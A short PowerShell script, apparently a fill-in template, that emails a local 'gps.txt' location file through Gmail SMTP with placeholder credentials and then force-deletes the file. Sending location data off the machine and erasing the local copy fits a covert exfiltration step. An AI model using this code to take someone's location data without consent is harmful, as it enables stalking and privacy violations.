# That is, to send the Location File of the Started location
$s="smtp.gmail.com"
$p=587
$u="Put_your_Gmail@gmail.com"
$pw="Enter_your_Gmail_App_Password"
$f=$u
$t=$u
$j="Shipment title"
$b="Shipping description" # Do not touch any further.
$a="gps.txt"

$sec=ConvertTo-SecureString $pw -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential $u, $sec
$msg=New-Object System.Net.Mail.MailMessage
$msg.From=$f
$msg.To.Add($t)
$msg.Subject=$j
$msg.Body=$b
$msg.Attachments.Add($a)

$smtp=New-Object System.Net.Mail.SmtpClient($s,$p)
$smtp.EnableSsl=$true
$smtp.Credentials=$cred

try {
    $smtp.Send($msg)
    $msg.Dispose()
    Remove-Item -Path "gps.txt" -Force
} catch {
    Write-Output "Erro ao enviar email: $_"
}
